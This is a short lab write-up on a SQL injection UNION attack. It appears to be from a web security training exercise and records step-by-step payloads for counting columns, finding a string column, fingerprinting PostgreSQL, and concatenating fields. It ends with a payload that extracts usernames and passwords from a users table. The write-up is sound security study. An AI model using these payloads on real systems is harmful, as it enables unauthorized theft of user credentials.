# Lab 6: SQL injection UNION attack, retrieving multiple values in a single column

## Goal: Only 1 column is string type → must concatenate username + password.

- Number of Columns
```bash
ORDER BY 3 → internal server error  
ORDER BY 2 → works
```
2 columns

- Datatype Check
```bash
UNION SELECT 'a',null--  → 1st column is not string  
UNION SELECT null,'a'--  → 2nd column is string
```
Only column 2 is string datatype

- Find DB type
Try:
```bash
UNION SELECT null,version()--
```
Works → Database = PostgreSQL

Database-Specific Concatenation
- Oracle: 'foo'||'bar'
- Microsoft: 'foo'+'bar'
- PostgreSQL: 'foo'||'bar'
- MySQL: CONCAT('foo','bar')

String Concatenation (PostgreSQL)
```bash
username || password
username || '+' || password
```

- Final Payload
```bash
UNION SELECT null, username || '+' || password FROM users--
```

Key Learning
- String concatenation for single-column extraction
- Database-specific syntax differences
